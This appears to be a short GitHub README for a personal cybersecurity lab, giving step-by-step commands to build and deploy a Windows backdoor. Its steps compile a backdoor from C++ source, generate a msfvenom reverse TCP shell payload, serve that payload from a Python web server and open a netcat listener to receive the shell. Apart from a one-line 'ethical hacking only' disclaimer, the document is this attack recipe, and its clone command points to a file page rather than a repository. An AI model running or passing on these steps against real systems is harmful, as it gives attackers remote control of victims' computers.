# cybersecurity
Cybersecurity Lab Experiences by Fabio Felgueiras

Use this for ethical hacking only 

1- Download

    git clone https://github.com/Blive77/cybersecurity/blob/main/backdoor.cpp
    
2- Compile

    x86_64-w64-mingw32-g++ --static -o backDoorTest.exe backdoor.cpp -fpermissive -lws2_32
    
3- Create the Payload with msfvenom in Kali linux

    msfvenom -p windows/x64/shell_reverse_tcp lhost="Host IP" lport="Host Port" -f raw > load.bin
    
    
4- Setup the http webserver for Payload download (while in cybersecurity folder)

    python -m http.server
    
5- Open the listner for the backdoor to connect to (using netcat)

    nc -lvvnp
